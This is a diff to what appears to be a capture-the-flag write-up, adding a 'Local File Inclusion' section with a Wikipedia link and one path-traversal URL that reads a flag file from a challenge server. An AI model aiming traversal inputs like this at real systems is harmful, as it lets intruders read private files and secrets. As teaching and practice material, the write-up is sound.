@@ -128,6 +128,23 @@ curl http://120.114.62.89:2014/index.php
 
 
 
+============================================
+
+web-5:Local File Inclusion<br /><br />
+--------------------------------------------
+
+LFI(Local File Inclusion):
+[https://en.wikipedia.org/wiki/File_inclusion_vulnerability](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)
+
+```
+http://120.114.62.89:2003/index.php?page=../../../../flag
+```
+
+
+
+
+<BR />
+
 
 ============================================
 
